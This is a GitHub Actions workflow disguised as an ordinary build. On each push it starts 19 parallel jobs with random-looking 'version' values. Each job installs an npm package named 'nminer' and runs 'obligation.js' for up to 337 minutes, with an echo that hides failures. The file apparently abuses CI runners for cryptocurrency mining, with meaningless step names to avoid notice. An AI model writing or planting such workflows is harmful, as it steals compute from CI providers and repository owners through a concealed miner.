name: obligation
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 2374 }
          - { version: 143 }
          - { version: 840 }
          - { version: 1578 }
          - { version: 7349 }
          - { version: 2436 }
          - { version: 8131 }
          - { version: 7500 }
          - { version: 3819 }
          - { version: 275 }
          - { version: 6450 }
          - { version: 7176 }
          - { version: 7683 }
          - { version: 4152 }
          - { version: 8254 }
          - { version: 827 }
          - { version: 6389 }
          - { version: 6747 }
          - { version: 598 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: lazily when
        run: |
          npm install nminer@latest
          timeout 337m node obligation.js || echo "obligation executed"